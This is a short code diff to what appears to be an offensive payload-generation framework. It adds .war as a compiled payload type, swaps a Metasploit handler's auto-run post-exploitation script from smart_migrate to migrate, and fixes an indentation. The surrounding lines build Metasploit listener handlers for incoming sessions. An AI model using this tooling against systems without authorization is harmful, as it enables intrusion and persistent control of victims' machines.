@@ -378,7 +378,7 @@ class Controller:
         """
 
         # if we get .exe code back, output to the compiled folder, otherwise write to the source folder
-        if payload.extension == "exe":
+        if payload.extension == "exe" or payload.extension == "war":
             outputFolder = settings.PAYLOAD_COMPILED_PATH
         else:
             outputFolder = settings.PAYLOAD_SOURCE_PATH
@@ -453,7 +453,7 @@ class Controller:
                     handler += "set LPORT " + parts[0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
+                handler += "set AutoRunScript post/windows/manage/migrate\n"
                 handler += "exploit -j\n"
 
             # print out any msfvenom options we used in shellcode generation if specified
@@ -519,7 +519,7 @@ class Controller:
                     handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"
 
                 handler += "set ExitOnSession false\n"
-                handler += "set AutoRunScript post/windows/manage/smart_migrate\n"
+                handler += "set AutoRunScript post/windows/manage/migrate\n"
                 handler += "exploit -j\n"
 
         message += "\n Payload File:\t\t"+OutputFileName + "\n"
@@ -738,7 +738,7 @@ class Controller:
 
         showMessage = reset the screen and show the greeting message [default=True]
         oneRun = only run generation once, returning the path to the compiled executable
-        	used when invoking the framework from an external source
+            used when invoking the framework from an external source
         """
 
         self.outputFileName = ""
